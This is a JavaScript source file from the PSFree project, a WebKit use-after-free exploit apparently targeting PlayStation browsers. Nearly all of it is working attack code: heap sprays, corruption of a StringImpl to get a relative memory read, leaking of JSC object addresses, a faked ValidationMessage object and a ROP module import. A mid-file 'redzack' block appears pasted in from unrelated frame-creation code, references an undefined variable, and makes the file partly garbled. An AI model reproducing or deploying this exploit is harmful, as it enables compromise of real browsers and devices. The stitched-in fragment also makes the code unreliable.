/* Copyright (C) 2023 anonymous

This file is part of PSFree.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>.  */

    import('./rop.mjs');

/* Executed after deleteBubbleTree */
function leakJSC() {
    debug_log("[+] Looking for the smashed StringImpl...");

    var arr_str = Object.getOwnPropertyNames(g_obj_str);

    /* Looking for the smashed string */
    for (let i = arr_str.length - 1; i > 0; i--) {
        if (arr_str[i].length > 0xff) {
            debug_log("[+] StringImpl corrupted successfully");
            g_relative_read = arr_str[i];
            g_obj_str = null;
            break;
        }
    }
    if (g_relative_read === null)
        die("[!] Failed to setup a relative read primitive");

    debug_log("[+] Got a relative read");

    var tmp_spray = {};

    for (var i = 0; i < 100000; i++)
        tmp_spray['Z'.repeat(8 * 2 * 8 - 5 - LENGTH_STRINGIMPL) + ('' + i).padStart(5, '0')] = 0x1337;

    let ab = new ArrayBuffer(LENGTH_ARRAYBUFFER);

    /* Spraying JSView */
    let tmp = [];
    for (let i = 0; i < 0x10000; i++) {
        /* The last allocated are more likely to be allocated after our relative read */
        if (i >= 0xfc00)
            g_arr_ab_3.push(new Uint8Array(ab));
        else
            tmp.push(new Uint8Array(ab));
    }
    tmp = null;


    /* 
     * /!\
     * This part must avoid as much as possible fastMalloc allocation
     * to avoid re-using the targeted object 
     * /!\ 
     */
    /* Use relative read to find our JSC obj */
    /* We want a JSView that is allocated after our relative read */
    while (g_jsview_leak === null) {
        Object.defineProperties({}, props);
        for (let i = 0; i < 0x800000; i++) {
            var v = undefined;
            if (g_relative_read.charCodeAt(i) === 0x50 &&
                g_relative_read.charCodeAt(i + 0x01) === 0x50 &&
                g_relative_read.charCodeAt(i + 0x02) === 0x50 &&
                g_relative_read.charCodeAt(i + 0x03) === 0x50) {
                if (g_relative_read.charCodeAt(i + 0x08) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x0f) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x10) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x17) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x18) === 0x0e &&
                    g_relative_read.charCodeAt(i + 0x1f) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x28) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x2f) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x30) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x37) === 0x00 &&
                    g_relative_read.charCodeAt(i + 0x38) === 0x0e &&
                    g_relative_read.charCodeAt(i + 0x3f) === 0x00)
                    v = new Int64(str2array(g_relative_read, 8, i + 0x20));
                else if (g_relative_read.charCodeAt(i + 0x10) === 0x50 &&
                    g_relative_read.charCodeAt(i + 0x11) === 0x50 &&
                    g_relative_read.charCodeAt(i + 0x12) === 0x50 &&
                    g_relative_read.charCodeAt(i + 0x13) === 0x50)
                    v = new Int64(str2array(g_relative_read, 8, i + 8));
            }
            if (v !== undefined && v.greater(g_timer_leak) && v.sub(g_timer_leak).hi32() === 0x0) {
                g_jsview_leak = v;
                props = null;
                break;
            }
        }
    }
    /* 
     * /!\
     * Critical part ended-up here
     * /!\ 
     */

    debug_log("[+] JSArrayBufferView: " + g_jsview_leak);

    /* Run the exploit again */
    prepareUAF();
}

/*
 * Executed after buildBubbleTree
 * and before deleteBubbleTree
 */
function confuseTargetObjRound1() {
    /* Force allocation of StringImpl obj. beyond Timer address */
    sprayStringImpl(SPRAY_STRINGIMPL, SPRAY_STRINGIMPL * 2);

    /* Checking for leaked data */
    if (findTargetObj() === false)
        die("[!] Failed to reuse target obj.");

    dumpTargetObj();

    g_fake_validation_message[4] = g_timer_leak.add(LENGTH_TIMER * 8 + OFFSET_LENGTH_STRINGIMPL + 1 - OFFSET_ELEMENT_REFCOUNT).asDouble();

    /*
     * The timeout must be > 5s because deleteBubbleTree is scheduled to run in
     * the next 5s
     */
    setTimeout(leakJSC, 6000);
}

function handle2() {
    /* focus elsewhere */
    input2.focus();
}

function reuseTargetObj() {
    /* Delete ValidationMessage instance */
    document.body.appendChild(g_input);

    /*
     * Free ValidationMessage neighboors.
     * SmallLine is freed -> SmallPage is cached
     */
    for (let i = NB_FRAMES / 2 - 0x10; i < NB_FRAMES / 2 + 0x10; i++)
        g_frames[i].setAttribute("rows", ',');

    /* Get back target object */
    for (let i = 0; i < NB_REUSE; i++) {
        let ab = new ArrayBuffer(LENGTH_VALIDATION_MESSAGE);
        let view = new Float64Array(ab);

        view[0] = guess_htmltextarea_addr.asDouble();   // m_element
        view[3] = guess_htmltextarea_addr.asDouble();   // m_bubble

        g_arr_ab_1.push(view);
    }

    if (g_round == 1) {
        /*
         * Spray a couple of StringImpl obj. prior to Timer allocation
         * This will force Timer allocation on same SmallPage as our Strings
         */
        sprayStringImpl(0, SPRAY_STRINGIMPL);

        g_frames = [];
        g_round += 1;
        g_input = input3;

        setTimeout(confuseTargetObjRound1, 10);
    } else {
        setTimeout(confuseTargetObjRound2, 10);
    }
}

function dumpTargetObj() {
    debug_log("[+] m_timer: " + g_timer_leak);
    debug_log("[+] m_messageHeading: " + g_message_heading_leak);
    debug_log("[+] m_messageBody: " + g_message_body_leak);
}

function findTargetObj() {
    for (let i = 0; i < g_arr_ab_1.length; i++) {
        if (!Int64.fromDouble(g_arr_ab_1[i][2]).equals(Int64.Zero)) {
            debug_log("[+] Found fake ValidationMessage");

            if (g_round === 2) {
                g_timer_leak = Int64.fromDouble(g_arr_ab_1[i][2]);
                g_message_heading_leak = Int64.fromDouble(g_arr_ab_1[i][4]);
                g_message_body_leak = Int64.fromDouble(g_arr_ab_1[i][5]);
                g_round++;
            }

            g_fake_validation_message = g_arr_ab_1[i];
            g_arr_ab_1 = [];
            return true;
        }
    }
    return false;
}

function prepareUAF () {
    g_input.setCustomValidity("s1");

    g_input.reportValidity();
    var div = document.createElement("div");
    document.body.appendChild(div);
    div.appendChild(g_input);

    /* First half spray */
    for (let i = 0; i < NB_FRAMES / 2; i++)
        g_frames[i].setAttribute("rows", g_rows1);

    /* Instantiate target obj */
    g_input.reportValidity();

    /* ... and the second half */
    for (let i = NB_FRAMES / 2; i < NB_FRAMES; i++)
        g_frames[i].setAttribute("rows", g_rows2);

    g_input.setAttribute("onfocus", "reuseTargetObj()");
    g_input.autofocus = true;
}
// test 2 redzack
var parent = document.getElementById("mainset");
child.style = "background-color: pink;";

parent.appendChild(child);
parent.rows = "30%,30%,30%"

var docRdyInt = null;
var frmCW = child.contentWindow;
if (frmCW) {
    //-- Must wait for the new frame to be writable, esp in Firefox.
    docRdyInt = setInterval(createFramedPage, 50);
}
else {
    alert("Oopsie! may be a rendering delay in some cases. Try code from console.");
}

function createFramedPage() {
    if (frmCW.document.readyState == "complete") {
        clearInterval(docRdyInt);
        frmCW.document.body.innerHTML = '<p>Hello World!</p>';
    }
}
// ende redzack
// ...........


/* HTMLElement spray */
function sprayHTMLTextArea() {
    debug_log("[+] Spraying HTMLTextareaElement ...");

    let textarea_div_elem = g_textarea_div_elem = document.createElement("div");
    document.body.appendChild(textarea_div_elem);
    textarea_div_elem.id = "div1";
    var element = document.createElement("textarea");

    /* Add a style to avoid textarea display */
    element.style.cssText = 'display:block-inline;height:1px;width:1px;visibility:hidden;';

    /*
     * This spray is not perfect, "element.cloneNode" will trigger a fastMalloc
     * allocation of the node attributes and an IsoHeap allocation of the
     * Element. The virtual page layout will look something like that:
     * [IsoHeap] [fastMalloc] [IsoHeap] [fastMalloc] [IsoHeap] [...]
     */
    for (let i = 0; i < SPRAY_ELEM_SIZE; i++)
        textarea_div_elem.appendChild(element.cloneNode());
}

/* StringImpl Spray */
function sprayStringImpl(start, end) {
    for (let i = start; i < end; i++) {
        let s = new String("A".repeat(LENGTH_TIMER - LENGTH_STRINGIMPL - 5) + i.toString().padStart(5, "0"));
        g_obj_str[s] = 0x1337;
    }
}

function go() {
    /* Init spray */
    sprayHTMLTextArea();

    if (window.midExploit)
        window.midExploit();

    g_input = input1;
    /* Shape heap layout for obj. reuse */
    prepareUAF();
}

run();
